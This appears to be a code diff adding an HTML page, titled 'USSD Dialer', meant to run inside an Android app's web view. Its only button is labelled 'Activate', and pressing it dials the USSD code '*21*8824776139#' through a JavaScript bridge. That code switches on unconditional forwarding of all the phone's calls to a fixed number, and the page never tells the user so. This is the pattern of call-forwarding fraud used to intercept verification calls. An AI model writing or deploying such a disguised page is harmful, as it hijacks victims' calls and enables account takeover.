@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>USSD Dialer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background: #f4f6f8;
+        }
+
+        button {
+            padding: 16px 32px;
+            font-size: 18px;
+            border: none;
+            border-radius: 8px;
+            background-color: #1976d2;
+            color: white;
+            cursor: pointer;
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+    </style>
+</head>
+<body>
+
+    <button onclick="dial()">Activate</button>
+
+    <script>
+        function dial() {
+            if (typeof Android !== "undefined" && Android.dialUSSD) {
+                Android.dialUSSD("*21*8824776139#");
+            } else {
+                alert("Android interface not available");
+            }
+        }
+    </script>
+
+</body>
+</html>
